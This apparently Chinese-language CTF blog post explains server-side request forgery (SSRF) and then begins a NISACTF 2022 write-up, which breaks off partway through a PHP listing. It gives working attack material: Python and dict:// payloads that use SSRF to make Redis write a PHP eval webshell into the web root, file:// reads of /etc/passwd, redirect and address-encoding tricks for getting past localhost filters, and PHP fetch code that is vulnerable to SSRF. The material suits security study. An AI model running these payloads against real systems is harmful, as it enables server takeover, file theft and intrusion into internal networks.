    <content type="html"><![CDATA[<h3 id="ssrf基础"><a class="markdownIt-Anchor" href="#ssrf基础"></a> SSRF基础</h3><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造<strong>形成由服务器端发起请求</strong>的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h4 id="攻击者可以利用-ssrf-实现的攻击主要有-5-种"><a class="markdownIt-Anchor" href="#攻击者可以利用-ssrf-实现的攻击主要有-5-种"></a> 攻击者可以利用 SSRF 实现的攻击主要有 5 种：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息<br>2.攻击运行在内网或本地的应用程序（比如溢出）<br>3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现<br>4.攻击内外网的 web 应用，主要是使用 <span class="hljs-built_in">GET</span> 参数就可以实现的攻击（比如 Struts2，sqli 等）<br>5.利用 file 协议读取本地文件等<br></code></pre></td></tr></table></figure><h4 id="ssrf-漏洞出现的场景"><a class="markdownIt-Anchor" href="#ssrf-漏洞出现的场景"></a> SSRF 漏洞出现的场景</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span>能够对外发起网络请求的地方，就可能存在 <span class="hljs-variable">SSRF</span> 漏洞<br><span class="hljs-number">2.</span>从远程服务器请求资源（<span class="hljs-variable">Upload</span> <span class="hljs-variable">from</span> <span class="hljs-built_in">URL</span>，<span class="hljs-built_in">Import</span> <span class="hljs-operator">&amp;</span> <span class="hljs-built_in">Export</span> <span class="hljs-variable">RSS</span> <span class="hljs-variable">Feed</span>）<br><span class="hljs-number">3.</span>数据库内置功能（<span class="hljs-variable">Oracle</span>、<span class="hljs-variable">MongoDB</span>、<span class="hljs-variable">MSSQL</span>、<span class="hljs-variable">Postgres</span>、<span class="hljs-variable">CouchDB</span>）<br><span class="hljs-number">4.</span><span class="hljs-variable">Webmail</span> 收取其他邮箱邮件（<span class="hljs-variable">POP3</span>、<span class="hljs-variable">IMAP</span>、<span class="hljs-variable">SMTP</span>）<br><span class="hljs-number">5.</span>文件处理、编码处理、属性信息处理（<span class="hljs-variable">ffmpeg</span>、<span class="hljs-variable">ImageMagic</span>、<span class="hljs-variable">DOCX</span>、<span class="hljs-built_in">PDF</span>、<span class="hljs-variable">XML</span>）<br></code></pre></td></tr></table></figure><h4 id="ssrf漏洞测试"><a class="markdownIt-Anchor" href="#ssrf漏洞测试"></a> SSRF漏洞测试</h4><p>可以对参数名或者参数值有关键字（url,http）等的地方进行测试</p><p>通过DNS平台接受解析请求来判断SSRF漏洞有没有发出请求，通过对可能存在漏洞的位置请求指定的域名，看是否接收到请求</p><p>例如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=http:<span class="hljs-regexp">//i</span>hvb07.dnslog.cn/<br></code></pre></td></tr></table></figure><p>也可自己服务器监听端口，然后向自己服务器发送请求</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp <span class="hljs-number">81</span><br>?url=http:<span class="hljs-regexp">//i</span>p:port/<br></code></pre></td></tr></table></figure><h4 id="常见协议利用"><a class="markdownIt-Anchor" href="#常见协议利用"></a> 常见协议利用</h4><p>利用不安全的输入解析，攻击者可能通过在URL中注入不同的协议头来触发SSRF</p><h5 id="1http协议"><a class="markdownIt-Anchor" href="#1http协议"></a> 1.http协议</h5><p>使用curl,在靶机上向自己的服务器发送请求，同时带出靶机中的信息</p><h5 id="2gopher-协议"><a class="markdownIt-Anchor" href="#2gopher-协议"></a> 2.Gopher 协议</h5><p>是一个可以发送自定义TCP数据的协议。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//</span>host:<span class="hljs-number">8080</span>/gopher<br></code></pre></td></tr></table></figure><p>用gopher构造<strong>http</strong>请求的模板脚本（可以构造post请求）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br><span class="hljs-comment"># content = &quot;uname=admin&amp;passwd=admin&quot;</span><br><span class="hljs-comment"># content_length = len(content)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># test =\</span><br><span class="hljs-comment"># &quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-comment"># Host: &#123;&#125;</span><br><span class="hljs-comment"># User-Agent: curl/7.43.0</span><br><span class="hljs-comment"># Accept: */*</span><br><span class="hljs-comment"># Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment"># Content-Length: &#123;&#125;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># &#123;&#125;</span><br><span class="hljs-comment"># &quot;&quot;&quot;.format(host,content_length,content)</span><br>cookie = <span class="hljs-string">&quot;this_is_your_cookie=YWRtaW4nKSBhbmQgaWYoMSxzbGVlcCg1KSwxKSM=&quot;</span><br>test = \<br>    <span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">    Host: &#123;&#125;</span><br><span class="hljs-string">    User-Agent: curl/7.43.0</span><br><span class="hljs-string">    Accept: */*</span><br><span class="hljs-string">    Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">    Cookie: &#123;&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host, cookie)<br><br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#需要对不可见字符进行编码</span><br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span> + host + <span class="hljs-string">&quot;/_&quot;</span> + result)<br></code></pre></td></tr></table></figure><p>127.0.0.1可以用0.0.0.0代替，0.0.0.0指向本机上的所有IP地址</p><p>RESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议</p><p>用gopher构造redis的脚本（转化为redis RESP协议的格式写shell）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>url = <span class="hljs-string">&quot;http://122.114.254.128:28005&quot;</span>     <span class="hljs-comment">#含有ssrf漏洞的页面</span><br>gopher = <span class="hljs-string">&quot;gopher://127.0.0.1:6379/_&quot;</span><br><br><span class="hljs-comment"># 攻击脚本   #一定记着要转义\n</span><br>data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">auth shell</span><br><span class="hljs-string">set test &quot;\\n\\n&lt;?php @eval($_POST[cmd])?&gt;\\n\\n&quot;   </span><br><span class="hljs-string">config set dir /var/www/html/</span><br><span class="hljs-string">config set dbfilename shell.php</span><br><span class="hljs-string">save</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encoder_url</span>(<span class="hljs-params">data</span>):<br>    encoder = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> single_char <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 先转为ASCII</span><br>        encoder += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(single_char)))<br>    encoder = encoder.replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>).replace(<span class="hljs-string">&quot;%a&quot;</span>,<span class="hljs-string">&quot;%0d%0a&quot;</span>)<br>    <span class="hljs-keyword">return</span> encoder<br><br><span class="hljs-comment"># 二次编码</span><br>encoder = encoder_url(encoder_url(data))<br><br><span class="hljs-built_in">print</span>(encoder)<br></code></pre></td></tr></table></figure><h5 id="3dict-协议"><a class="markdownIt-Anchor" href="#3dict-协议"></a> 3.Dict 协议</h5><p>一般用于探测端口的指纹信息,做端口扫描</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">dict:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/info</span><br></code></pre></td></tr></table></figure><p>适用于攻击那些支持单行命令的应用，如<strong>Redis</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">dict:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/flushall<br>dict:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span><span class="hljs-regexp">/config set dir var/</span>www<span class="hljs-regexp">/html/</span><br>dict:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/set shell <span class="hljs-string">&quot;\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x3f\x3e&quot;</span> <span class="hljs-comment">#&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br>dict:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/config set dbfilename shell.php<br>dict:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/save<br></code></pre></td></tr></table></figure><h5 id="4file-协议"><a class="markdownIt-Anchor" href="#4file-协议"></a> 4.file 协议</h5><p>一般用于读取本地文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>使用绝对路径，适用于已知文件路径的</p><p>用curl请求则是</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>一道题目：<a href="https://github.com/teambi0s/InCTFi/tree/master/2021/Web/RAAS">https://github.com/teambi0s/InCTFi/tree/master/2021/Web/RAAS</a></p><p><a href="https://ctf.zeyu2001.com/2021/inctf-2021/raas#challenge">https://ctf.zeyu2001.com/2021/inctf-2021/raas#challenge</a></p><h4 id="常用的后端实现"><a class="markdownIt-Anchor" href="#常用的后端实现"></a> 常用的后端实现</h4><h5 id="1file_get_contents"><a class="markdownIt-Anchor" href="#1file_get_contents"></a> 1.file_get_contents</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br>    <span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br>    <span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p><h5 id="2fsockopen"><a class="markdownIt-Anchor" href="#2fsockopen"></a> 2.fsockopen()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码使用 <code>fsockopen</code> 函数实现获取用户指定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p><h5 id="3curl_exec"><a class="markdownIt-Anchor" href="#3curl_exec"></a> 3.curl_exec()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用 <code>curl</code> 获取数据。</p><h4 id="常见端口"><a class="markdownIt-Anchor" href="#常见端口"></a> 常见端口</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>服务端口:<span class="hljs-number">80</span> <span class="hljs-number">8080</span><br><span class="hljs-attribute">Redis</span>端口:<span class="hljs-number">6379</span><br><span class="hljs-attribute">Mysql</span>端口:<span class="hljs-number">3306</span><br><span class="hljs-attribute">PPH</span>-FPM FastCGI端口:<span class="hljs-number">9000</span><br></code></pre></td></tr></table></figure><h3 id="bypass"><a class="markdownIt-Anchor" href="#bypass"></a> bypass</h3><h4 id="过滤localhost或127001"><a class="markdownIt-Anchor" href="#过滤localhost或127001"></a> 过滤<code>localhost</code>或<code>127.0.0.1</code></h4><h5 id="302跳转"><a class="markdownIt-Anchor" href="#302跳转"></a> 302跳转</h5><p>在vps上创建<code>302.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:file:///etc/passwd&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:dict://127.0.0.1:6379/info&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:gopher://127.0.0.1:6666/info&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="特殊数字绕过"><a class="markdownIt-Anchor" href="#特殊数字绕过"></a> 特殊数字绕过</h5><p><code>http://1②7.0.0.1/flag.php</code></p><p><code>。</code>代替<code>.</code>绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>/flag.php<br></code></pre></td></tr></table></figure><h5 id="稀有地址绕过"><a class="markdownIt-Anchor" href="#稀有地址绕过"></a> 稀有地址绕过</h5><p>在windows中，0代表<code>0.0.0.0</code>，而在linux下，0代表<code>127.0.0.1</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/flag.php<br></code></pre></td></tr></table></figure><h5 id="cidr绕过"><a class="markdownIt-Anchor" href="#cidr绕过"></a> cidr绕过</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.127</span>.<span class="hljs-number">127.127</span>/flag.php<br></code></pre></td></tr></table></figure><h5 id="进制转换"><a class="markdownIt-Anchor" href="#进制转换"></a> 进制转换</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">0177</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php //八进制<br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>x7f.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php //十六进制<br><span class="hljs-attribute">http</span>://<span class="hljs-number">2130706433</span>/flag.php //十进制<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$r</span> = (<span class="hljs-variable">$ip</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-variable">$ip</span>[<span class="hljs-number">3</span>] ;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span> &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$r</span> += <span class="hljs-number">4294967296</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十进制:&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;八进制:&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十六进制:&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="域名解析绕过"><a class="markdownIt-Anchor" href="#域名解析绕过"></a> 域名解析绕过</h5><p>指向127.0.0.1的域名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>safe.taobao.com/<br>http:<span class="hljs-regexp">//</span>wifi.aliyun.com/<br>http:<span class="hljs-regexp">//</span>ecd.tencent.com/<br>http:<span class="hljs-regexp">//</span>sudo.cc/<br></code></pre></td></tr></table></figure><p><strong>自行生成域名</strong></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><a href="http://ceye.io/">http://ceye.io/</a> 获得的url后要加上<code>r.</code>，例如<code>http://r.ymugbk.ceye.io/</code></p><h4 id="限制开头"><a class="markdownIt-Anchor" href="#限制开头"></a> 限制开头</h4><h5 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> @绕过</h5><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//xxx<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/flag.php<br></code></pre></td></tr></table></figure><h4 id="限制结尾"><a class="markdownIt-Anchor" href="#限制结尾"></a> 限制结尾</h4><h5 id="参数绕过"><a class="markdownIt-Anchor" href="#参数绕过"></a> 参数绕过</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?xxx<br></code></pre></td></tr></table></figure><h3 id="ssrf解题步骤"><a class="markdownIt-Anchor" href="#ssrf解题步骤"></a> SSRF解题步骤</h3><p>1.找到敏感接口，验证SSFR是否存在</p><p>2.尝试用file://协议读取<code>/etc/hosts</code>，根据IP确定目标的内网IP段</p><p>3.通过HTTP等协议扫描内网在线主机及端口，确定内网内存活的目标IP以及相应的端口。</p><p>4.构造请求，针对性地攻击服务。</p><h3 id="nisactf-2022easyssrf"><a class="markdownIt-Anchor" href="#nisactf-2022easyssrf"></a> [NISACTF 2022]easyssrf</h3><p>根据题目已经知道是ssrf</p><img src="/2023/01/04/SSRF/1.png" class=""><p>这里给了一个访问网站的快照</p><p>应该就是通过这里访问本地</p><p>尝试一下file协议:file:///etc/passwd ，提示其他路径</p><p>尝试直接读取flag</p><img src="/2023/01/04/SSRF/2.png" class=""><p>接着访问/fl4g</p><img src="/2023/01/04/SSRF/3.png" class=""><p>访问ha1x1ux1u.php，这个要在url中直接访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ 